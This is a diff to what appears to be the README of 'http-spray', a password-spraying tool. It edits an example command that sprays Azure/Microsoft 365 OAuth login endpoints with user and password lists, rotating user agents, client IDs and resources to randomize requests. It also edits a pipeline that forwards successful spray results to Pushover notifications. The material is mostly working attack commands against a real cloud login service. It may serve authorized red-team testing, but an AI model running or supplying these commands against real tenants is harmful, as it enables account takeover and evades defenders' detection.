@@ -72,7 +72,7 @@ http-spray -t https://login.windows.net/corp.com/oauth2/token -m msauth --client
 Password spraying against Azure/M365 with full request randomization.
 
 ~~~ bash
-http-spray -t https://login.microsoftonline.com/corp.com/oauth2/token -m msauth --user-agents ./wordlists/desktop-user-agents.csv --client-id ./wordlists/m365-public-clients.csv --resource ./wordlists/m365-resources.csv -u ./users.txt -p ./passwords.txt | tee -a ./http-spray.json
+http-spray -t https://login.microsoftonline.com/corp.com/oauth2/token -m msauth --user-agent ./wordlists/desktop-user-agents.csv --client-id ./wordlists/m365-public-clients.csv --resource ./wordlists/m365-resources.csv -u ./users.txt -p ./passwords.txt | tee -a ./http-spray.json
 ~~~
 
 > [!note]
@@ -83,7 +83,5 @@ http-spray -t https://login.microsoftonline.com/corp.com/oauth2/token -m msauth 
 Integration for [pushover.net](https://pushover.net/).
 
 ~~~ bash
-tail -f ./http-spray.json | jq -c 'select(.status!="invalid" and .status!="exists")|del(.user, .password)' | while read -r line; do
-    curl -sSf https://api.pushover.net/1/messages.json -d user=$PUSHOVER_USER -d token=$PUSHOVER_TOKEN --data-urlencode title='Password Spraying' --data-urlencode message="$line"
-done
+tail -f ./http-spray.json | jq -c 'select(.status!="invalid" and .status!="exists")|del(.user, .password)' | xargs -r -I'{}' -- curl -sSf https://api.pushover.net/1/messages.json -d "user=$PUSHOVER_USER" -d "token=$PUSHOVER_TOKEN" --data-urlencode title='Password Spraying' --data-urlencode 'message={}'
 ~~~
